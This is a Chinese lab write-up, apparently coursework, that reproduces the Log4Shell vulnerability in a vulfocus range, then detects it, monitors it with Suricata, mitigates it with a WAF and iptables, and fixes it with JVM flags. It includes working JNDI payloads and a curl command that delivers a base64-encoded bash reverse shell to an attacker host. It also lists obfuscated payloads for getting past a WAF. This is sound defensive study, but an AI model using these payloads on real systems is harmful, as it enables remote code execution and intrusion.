### log4j 漏洞复现环境搭建+利用复现+缺陷代码逆向分析、定位漏洞代码片段+缓解+修复

---

#### 一、log4j 漏洞复现环境搭建

##### 1.首先进入到vulfocus的首页，之后打开左侧菜单中的漏洞管理，在搜索栏搜索关键字：`log4j`。

![搜索log4j镜像环境](picture/搜索log4j镜像环境.png)

##### 2.下载环境镜像之后点击左侧菜单的”首页“，在下方可以看到已经下载到本地的环境镜像，之后点击启动，即可一键启动漏洞复现环境。

![启动漏洞复现环境](picture/启动漏洞复现环境.png)

点击之后可以看到弹出的提示框，显示我们已经启动的漏洞复现环境的访问地址等镜像信息。

![启动log4j漏洞环境成功](picture/启动log4j漏洞环境成功.png)

##### 3.访问靶场Web页面

![进入log4j漏洞环境](picture/进入log4j漏洞环境.png)

点击蓝色链接跳转如下：

![点击页面中蓝色链接](picture/点击页面中蓝色链接.png)

---

#### 二、检测漏洞存在性

1.使用`docker ps`查看容器信息，看到其容器名称为`inspiring_carver`

![查看容器信息](picture/查看容器信息.png)

2.进入容器

```
docker exec -it inspiring_carver bash
```

![进入容器查看jar包](picture/进入容器查看jar包.png)

3.查看到容器目录下有demo.jar文件，拉取到容器的宿主机

```
# docker cp <容器名称或ID>:<容器内文件路径> <宿主机目标路径>
sudo docker cp inspiring_carver:/demo/demo.jar ./
```

![拉取jar包到容器的宿主机](picture/拉取jar包到容器的宿主机.png)

4.使用[jadx](https://github.com/skylot/jadx/releases/tag/v1.5.1)反编译demo.jar

![定位代码片段](picture/定位代码片段.png)

源码中有 Log4j2RceApplic 的类，其中正是违反了”KISS“原则，验证了该漏洞的存在。

---

#### 三、验证漏洞可利用性

> 使用PoC手动检测
>
> **PoC** 是“概念验证”（Proof of Concept）的缩写，指的是用来**证明某个漏洞或攻击方法确实存在且可被利用**的工具或脚本。
>
> 在网络安全中，PoC 通常是指一个能够触发漏洞的测试脚本或方法，目的是：
>  ✅ 验证漏洞是否存在
>  ✅ 展示漏洞的可利用性
>  ✅ 帮助开发者或安全研究人员理解漏洞的成因和影响
>
> 🏹 **PoC 在 Log4j 漏洞中的应用**
>
> 在 Log4j 漏洞（Log4Shell）中，PoC 通常是一个用来触发 JNDI 注入的 HTTP 请求或 Java 代码。
>  PoC 的作用是：
>
> 1. 通过发送特定的 Payload，触发 Log4j 的 JNDI 注入。
> 2. 响应中显示相关的回显信息或返回特定状态码。
> 3. 根据返回的结果，判断漏洞是否存在。

1.[DnsLog](http://dnslog.cn/)下获取专属随机子域名：`nxz5uf.dnslog.cn`，我们可以使用其进行构建漏洞检测payload：`payload="${jndi:ldap://nxz5uf.dnslog.cn/exp}"`

![dnslog下获取子域名](picture/dnslog下获取子域名.png)

2.使用kali-attacker进行漏洞存在性验证，直接利用课程中给出的示例形式`curl -X POST http://192.168.109.4:23480/hello -d 'payload="${jndi:ldap:nxz5uf.dnslog.cn/exp}"'`，会发现目标网址不支持POST方法的请求：

![课程示例使用出现报错](picture/课程示例使用出现报错.png)

3.在此执行命令 `curl -X OPTIONS 目标地址 -i` 查看目标网址支持的HTTP请求方法：

![查看支持的请求](picture/查看支持的请求.png)

**那么如果 `POST` 不被支持，如何绕过？**

在此我们使用了 `GET` 请求+参数

```
curl -G http://192.168.109.4:23480/hello --data-urlencode 'payload=${jndi:ldap://test.dnslog.cn/exp}'
```

> **命令解析**
>
> ```bash
> curl -G http://192.168.109.4:23480/hello --data-urlencode 'payload=${jndi:ldap://test.dnslog.cn/exp}'
> ```
>
> 这个命令使用 `curl` 发送了一个 **GET 请求**，并通过 **URL 参数** 的方式传递了 `payload` 数据。
>
> ------
>
> **各部分解析**
>
> | **部分**                                                     | **作用**                                                     |
> | ------------------------------------------------------------ | ------------------------------------------------------------ |
> | `curl`                                                       | 使用 `curl` 命令行工具发送 HTTP 请求                         |
> | `-G`                                                         | 让 `curl` 以 **GET 方法** 发送请求（默认 `curl` 发送的是 `POST`，加上 `-G` 变成 `GET`） |
> | `http://192.168.109.4:23480/hello`                           | 目标 URL，即 Web 服务器的 `/hello` 接口                      |
> | `--data-urlencode 'payload=${jndi:ldap://test.dnslog.cn/exp}'` | **URL 编码参数**，把 `payload=${jndi:ldap://test.dnslog.cn/exp}` 以 URL 查询参数（Query Parameter）的形式添加到请求中 |
>
> ------
>
> **实际发送的请求**
>
> `curl -G` 的作用是 **把 `--data-urlencode` 里的参数转换成 URL 查询参数**，最终 `curl` 发送的 HTTP 请求会变成：
>
> ```
> GET /hello?payload=%24%7Bjndi%3Aldap%3A%2F%2Ftest.dnslog.cn%2Fexp%7D HTTP/1.1
> Host: 192.168.109.4:23480
> User-Agent: curl/7.XX.X
> Accept: */*
> ```
>
> 这里：
>
> - ```
>   payload=%24%7Bjndi%3Aldap%3A%2F%2Ftest.dnslog.cn%2Fexp%7D
>   ```
>
>   - `%24` → `$`
>   - `%7B` → `{`
>   - `%7D` → `}`
>   - `%3A` → `:`
>   - `%2F` → `/`
>
> 所以 `payload` 实际传递的内容仍然是：
>
> ```
> payload=${jndi:ldap://test.dnslog.cn/exp}
> ```
>
> ------
>
> **为什么这样做？**
>
> 1. **绕过 POST 限制**
>    - 目标服务器 **不支持 `POST`**（返回 `405 Method Not Allowed`）。
>    - 但 **支持 `GET`**，所以我们用 `GET` 请求携带 `payload`。
> 2. **URL 编码防止干扰**
>    - `--data-urlencode` 让 `curl` 自动对特殊字符（如 `{ } : /`）进行 URL 编码，防止被服务器拦截或误解。
> 3. **适用于 GET 方式传参的 Web 服务器**
>    - 一些服务器会直接把 `GET` 请求的 **查询参数** 作为日志处理，从而触发 Log4j 漏洞。
>
> ------
>
> **绕过 `GET` 过滤的进一步尝试**
>
> 如果服务器检查 `payload` 关键字，可以尝试：
>
> ```bash
> curl -G http://192.168.109.4:23480/hello --data-urlencode 'test=${jndi:ldap://test.dnslog.cn/exp}'
> ```
>
> - **把 `payload` 换成 `test`**
> - 有些服务器可能会记录所有参数，即使参数名不同
>
> 如果服务器限制了 `GET` 参数的格式，可以尝试：
>
> ```bash
> curl "http://192.168.109.4:23480/hello?payload=${jndi:ldap://test.dnslog.cn/exp}"
> ```
>
> - 直接拼接参数，而不使用 `--data-urlencode`
>
> ------
>
> **总结**
>
> - `-G` 让 `curl` 发送 **GET 请求**
> - `--data-urlencode` **URL 编码参数**，防止解析出错
> - 适用于 **Log4j 漏洞利用**，服务器日志如果记录 `GET` 参数，就可能触发漏洞
>
> 如果目标系统仍然没有回显，你可能需要：
>
> - 换一个参数名，如 `p=`、`q=`、`test=`
> - 使用 `X-HTTP-Method-Override` 伪造 `POST`
> - 观察服务器是否有 WAF，尝试绕过字符串检测

4.在此之前我们查看DnsLog网站的Record为空：

![dnslog记录为空](picture/dnslog记录为空.png)

5.使用绕过POST的curl攻击请求：

```
curl -G http://192.168.109.4:13806/hello --data-urlencode 'payload=${jndi:ldap://nxz.dnslog.cn/exp}'
```

6.可以从被攻击机的udp 53端口中看到DNS解析请求：

![验证漏洞可利用性（本机）](picture/验证漏洞可利用性（本机）.png)

7.与此同时在DnsLog进行刷新纪录，可以看到成功接收到解析记录：

![验证漏洞可利用性（DnsLog）](picture/验证漏洞可利用性（DnsLog）.png)

---

#### 四、漏洞利用

1.下载并解压[JNDIExploit工具](https://github.com/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)

![下载攻击并解压攻击工具](picture/下载攻击并解压攻击工具.png)

2.攻击机监听指定端口（在此选择7777端口），之后运行JNDEExploit工具监听在attackerIP上。

```
# 攻击机监听7777端口
nc -l -p 7777
# 运行JNDEExploit工具
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.109.5
```

![漏洞利用1-2步](picture/漏洞利用1-2步.png)

3.使用攻击机发送漏洞利用请求，可以看到反弹shell成功的结果

```
 curl -G http://192.168.109.4:22220//hello --data-urlencode 'payload=${jndi:ldap://192.168.109.5:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.109.5/7777 0>&1' | base64 -w 0 | sed 's/+/%2B/g' | sed 's/=/%3d/g')'}'
```

![漏洞利用第3步](picture/漏洞利用第3步.png)

4.在shell下查看权限，之后在/tmp下找到flag，漏洞利用成功！

```
flag-{bmha526a63d-5684-471c-afc2-18fed1e6ec0a}
```

> ps：在vulfocus下载的靶场环境中的flag一般都存放在/tmp下

![get flag，漏洞利用成功](picture/get flag，漏洞利用成功.png)

5.在管理界面提交该flag，通过

![管理界面提交flag通过](picture/管理界面提交flag通过.png)

---

#### 五、漏洞利用流量监测

1.启动靶机镜像（我们之前已经启动过了，这一步可以不进行操作）

```
docker run -d --name log4shell -p 5555:8080 vulfocus/log4j2-rce-2021-12-09:latest
```

2.启动 suricata 检测容器，此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP

```
docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
```

![启动suricata检测容器](picture/启动suricata检测容器.png)

3.更新 suricata 规则，更新完成测试完规则之后会自动重启服务

```
docker exec -it suricata suricata-update -f
```

![更新suricata规则](picture/更新suricata规则.png)

4.监视 suricata 日志 

```
docker exec -it suricata tail -f /var/log/suricata/fast.log
```



---

#### 六、漏洞缓解

1.安装雷池WAF（执行以下命令）

> 需提前装好docker环境

```
bash -c "$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/setup.sh)"
```

![安装雷池waf](picture/安装雷池waf.png)

安装完成后如下图所示：

![waf安装成功](picture/waf安装成功.png)

2.访问控制台，输入用户名和密码后进入WAF网页主界面

![waf主界面](picture/waf主界面.png)

3.之后进入 `防护应用 - 应用管理` 页面, 点击右上角的 `添加应用` 按钮进行配置

![waf-防护应用-添加应用](picture/waf-防护应用-添加应用.png)

4.配置8081为监听端口（与正在运行的端口不重复即可），配置上游服务器为http://172.17.0.2:8080 （即：http://{靶场在docker容器内的地址}:{被映射的内部端口}）

ps：靶场在docker容器内的地址可以执行命令`docker inspect {容器名称} | grep '"IPAddress"'`进行查看：

![查看靶场在docker容器内的地址](picture/查看靶场在docker容器内的地址.png)

具体配置如下：

![配置应用（监听端口+上游服务器）](picture/配置应用（监听端口+上游服务器）.png)

> 一些关键字段的说明如下:
>
> - 域名: 通过雷池访问该应用时使用的域名 (支持使用 `*` 做为通配符)，注意修改 DNS 解析到雷池 IP
> - 端口: 雷池监听的端口 (如需配置 HTTPS 服务, 请勾选 SSL 选项并配置对应的 SSL 证书)
> - 上游服务器: 被保护的 Web 服务的实际地址

5.进入 `防护配置 - 自定义规则` 页面, 点击右上角的 `添加规则` 按钮进行配置

![自定义规则界面添加规则](picture/自定义规则界面添加规则.png)

6.我们的目的是对log4j漏洞进行缓解，已知Log4j 攻击最常见的触发方式：通过 URL 传入 `${jndi:ldap://...}`，那么我们可以拦截 URL 中含有 `jndi:ladp` 字符串的请求（配置黑名单规则）。

对应的配置规则如下：

![waf-添加黑名单匹配规则](picture/waf-添加黑名单匹配规则.png)

7.之后将防火墙自带的一些防御规则（`防护配置-加强规则`）和防护模块（`防护配置-防护模块`）进行禁用，减少不确定变量的产生，确保实验正确进行。

8.此时waf的配置已经完成，但是waf是对8081端口进行监听，之后将流量传至上游服务器http://172.17.0.2:8080，但是我们真实暴露出的靶场地址192.168.109.4:22220还是可以访问的。我们的目的是让访客只能通过8081端口进行靶场的访问（通过我们的waf），所以我们需要对22220端口配置相应的规则，使得其只能被内部网络访问，而不能被外部网络访问。运行以下命令：

```
sudo iptables -A INPUT -p tcp --dport 22220 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22220 -j DROP
```

![对22220端口（靶场映射端口）添加规则](picture/对22220端口（靶场映射端口）添加规则.png)

8.查看`DOCKER` 链的详细规则信息（DNAT规则会在重启对应容器时自动配置）

执行`sudo iptables -t nat -L DOCKER -v -n --line-numbers` 命令，在 `nat` 表中列出 `DOCKER` 链的详细规则信息

| 命令部分         | 解释                                                         |
| ---------------- | ------------------------------------------------------------ |
| `sudo`           | 使用超级用户权限执行命令。iptables 的配置和修改需要 root 权限。 |
| `iptables`       | 主命令，管理 Linux 的防火墙规则。                            |
| `-t nat`         | 指定要操作的 **nat（Network Address Translation）表**。Docker 主要通过 NAT 表进行端口映射。 |
| `-L`             | 列出（List）当前表中所有的规则。                             |
| `DOCKER`         | 目标链（Chain）。Docker 会在 `nat` 表中自动创建一个名为 `DOCKER` 的链，用于管理 Docker 容器的端口映射。 |
| `-v`             | 显示详细（verbose）信息，包括命中次数、传输的字节数等。      |
| `-n`             | 不反向解析 IP 地址，直接显示数值格式的 IP 地址（避免 DNS 解析带来的延迟）。 |
| `--line-numbers` | 显示规则的行号，便于使用 `iptables -D` 命令按行号删除规则。  |

![列出 `DOCKER` 链的详细规则信息](picture/列出 `DOCKER` 链的详细规则信息.png)

其中第8条规则，它是在 `DOCKER` 链中的 **DNAT（目标地址转换）** 规则，表示 Docker 将对目标端口 `22220` 的访问重定向到 Docker 容器内的 `8080` 端口。

> **DNAT（目的网络地址转换）** 是一种网络地址转换（NAT）技术，主要用于在**数据包进入网络时**，将其目标地址（目的 IP 地址或端口号）重写为其他地址。
>
> 在 Linux 系统中，DNAT 规则是通过 `iptables` 的 `nat` 表中的 `PREROUTING` 链进行配置的。

![ip包处理顺序](picture/ip包处理顺序.jpg)

> PREROUTING 是机器接受到的每个 ip 包最先被处理的地方，目标端口的转换，目标地址的转换都在这个链做处理。从这往后就开始有 2 条岔路。 如果 ip 包的目标地址是本机，那么它会进入到 INPUT 链，根据 INPUT 链的规则，来决定值丢弃还是处理；如果 ip 包的目标地址不是本机， 那么就会进入 FORWARD 链。根据 FORWARD 链的规则进行处理，如果 ip 包没有被接受了，那么由本机进行转发（这里需要开启机器的 forward 才能转发，`echo 1 > /proc/sys/net/ipv4/ip_forward`）。

那么外部在通过192.168.109.4访问22220端口的时候，Docker 的 DNAT 规则会在 `PREROUTING` 阶段首先匹配并触发，连接被直接重定向到容器的 `172.17.0.2:8080`，就会导致iptable我们手动设置的屏蔽外部网络访问22220端口的INPUT链规则不起作用。因此我们需要将此条规则进行删除：

```
sudo iptables -t nat -D DOCKER 8  #8为需要删除的DNAT规则对应的序号
```

9.至此，缓解基本完成。

10.对漏洞缓解效果进行验证：

在attacker上对目标地址使用常规payload`${jndi:ldap://...}`进行攻击：

![通过waf访问被拦截](picture/通过waf访问被拦截.png)

尝试大小写绕过，也被拦截：

![payload大小写转换，也被拦截](picture/payload大小写转换，也被拦截.png)

11.对缓解之后的漏洞进行绕过，有以下常规的绕过方式：

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

我们在此使用

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
```

绕过成功：

![缓解后绕过成功](picture/缓解后绕过成功.png)

---

#### 七、漏洞修复

1.原理分析：

Log4j 提供了一个名为 **JNDI（Java Naming and Directory Interface）** 的功能，允许从远程服务器中动态加载类或资源。
 在日志消息或参数中，Log4j 支持解析形如 `${}` 的表达式，并允许通过 JNDI 加载外部数据。

攻击者在用户输入（如 URL、Header、Body、参数等）中注入恶意的 JNDI 语句，例如：

```java
${jndi:ldap://attacker.com/exploit}
```

Log4j 在处理日志时会对 `${}` 进行解析，当 Log4j 解析类似 `${jndi:ldap://...}` 的字符串时，JNDI 通过 `InitialContext.lookup()` 加载对象：

```java
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup("ldap://attacker.com/exploit");
```

➡️ 如果远程服务器返回了一个恶意的 Java 类，Java 将会直接加载和执行它，导致 RCE。

2.所以我们选择修复方式：通过**增加参数配置**

 ✔️ 禁用 `JNDI` 查找功能
 ✔️ 完全禁用 JNDI 加载
 ✔️ 禁用 `RMI` 和 `LDAP` 加载远程类
 ✔️ 禁用 DNS 缓存，防止基于 DNS 的利用
 ✔️ 在配置文件中明确禁用 JNDI 相关组件

在2.10以上版本的log4j中，提供了配置属性，这些配置可以配置在系统环境变量、JVM启动参数、log4j配置文件中，任意一个地方配置均可生效。

- 停止并删除原容器：

  ```
  docker stop romantic_ardinghelli
  docker rm romantic_ardinghelli
  ```

- 添加参数配置启动容器

  ```
  docker run -d --name log4shell \
  -p 22220:8080 \
  vulfocus/log4j2-rce-2021-12-09:1 \
  java -Dlog4j2.formatMsgNoLookups=true \
  -Dcom.sun.jndi.rmi.object.trustURLCodebase=false \
  -Dcom.sun.jndi.ldap.object.trustURLCodebase=false \
  -Dsun.net.inetaddr.ttl=0 \
  -Dsun.net.inetaddr.negative.ttl=0 \
  -jar /demo/demo.jar
  ```

- 与之前搭建好的waf搭配使用

- 进行漏洞利用

  常规利用失败：

  ![修复后常规payload利用失败](picture/修复后常规payload利用失败.png)

  大小写绕过失败：

  ![修复后大小写绕过失败](picture/修复后大小写绕过失败.png)

  base64绕过失败：

  ![修复后，base64绕过失败](picture/修复后，base64绕过失败.png)

  使用其他协议绕过均失败：

  ![修复后，协议绕过失败](picture/修复后，协议绕过失败.png)

  验证了漏洞修复的效果

3.仍待续作：添加更多防火墙规则、直接进行版本升级(jar包提取+问题包替换+重打包/对配置文件相应的版本号进行修改+利用maven重加载配置文件)进行修复……



---

#### 遇到的问题及解决方案

1.GitHub下载缓慢或一直处于等待状态

速度过慢：

![image-20250303193742149](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250303193742149.png)

解决方案：

（1）国内网络访问 Github 速度过慢的原因有许多，但其中最直接和原因是其 CND [域名](https://dnspod.cloud.tencent.com/?from_column=20065&from=20065)遭到 DNS 污染，导致我们无法连接使用 GitHub 的加速服务，因此访问速度缓慢。简单理解：CDN「Content Delivery Network」，即[内容分发网络](https://cloud.tencent.com/product/cdn?from_column=20065&from=20065)，依靠部署在各地的边缘[服务器](https://cloud.tencent.com/product/cvm/?from_column=20065&from=20065)，平衡中心服务器的负荷，就近提供用户所需内容，提高响应速度和命中率。DNS 污染，是指一些刻意或无意制造出来的数据包，把域名指向不正确的 IP 地址，阻碍了网络访问。我们默认从目标网址的最近 CDN 节点获取内容，但当节点过远或 DNS 指向错误时，就会造成访问速度过慢或无法访问的问题

（2）修改方法，把下方的内容复制到文本末尾（需要管理员权限修改）：

```
# GitHub520 Host Start
140.82.113.4                  alive.github.com
140.82.113.4                  live.github.com
35.89.211.130                 github.githubassets.com
140.82.113.4                  central.github.com
35.91.205.163                 desktop.githubusercontent.com
140.82.113.4                  assets-cdn.github.com
54.187.119.73                 camo.githubusercontent.com
151.101.1.6                   github.map.fastly.net
151.101.1.6                   github.global.ssl.fastly.net
140.82.113.4                  gist.github.com
185.199.108.153               github.io
140.82.113.4                  github.com
192.0.66.2                    github.blog
140.82.113.4                  api.github.com
54.187.192.31                 raw.githubusercontent.com
18.237.195.231                user-images.githubusercontent.com
52.25.220.42                  favicons.githubusercontent.com
35.90.114.155                 avatars5.githubusercontent.com
35.91.205.163                 avatars4.githubusercontent.com
54.187.119.73                 avatars3.githubusercontent.com
34.217.211.252                avatars2.githubusercontent.com
54.68.45.78                   avatars1.githubusercontent.com
35.90.114.155                 avatars0.githubusercontent.com
52.25.220.42                  avatars.githubusercontent.com
140.82.113.4                  codeload.github.com
72.21.206.80                  github-cloud.s3.amazonaws.com
72.21.206.80                  github-com.s3.amazonaws.com
72.21.206.80                  github-production-release-asset-2e65be.s3.amazonaws.com
72.21.206.80                  github-production-user-asset-6210df.s3.amazonaws.com
72.21.206.80                  github-production-repository-file-5c1aeb.s3.amazonaws.com
185.199.108.153               githubstatus.com
140.82.114.18                 github.community
52.224.38.193                 github.dev
140.82.113.4                  collector.github.com
54.202.167.66                 pipelines.actions.githubusercontent.com
35.92.254.178                 media.githubusercontent.com
54.214.143.191                cloud.githubusercontent.com
54.214.169.83                 objects.githubusercontent.com
13.107.219.40                 vscode.dev


# Update time: 2022-10-09T14:09:11+08:00
# Update url: https://raw.hellogithub.com/hosts
# Star me: https://github.com/521xueweihan/GitHub520
# GitHub520 Host End
```

（3）刷新 DNS（大部分情况下是直接生效，未生效则尝试本办法）

Linux 命令：`sudo /etc/init.d/nscd restart`，如报错则须安装：`sudo apt install nscd` 

**解决成功：**

![image-20250303193705451](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20250303193705451.png)





---

### 参考文献

[IPTABLES INPUT 和 PREROUTING 的区别 - allsunday](https://blog.allsunday.io/posts/2014-05-27-iptables-input和prerouting的区别/)

[上手指南 | 雷池 SafeLine](https://docs.waf-ce.chaitin.cn/zh/上手指南)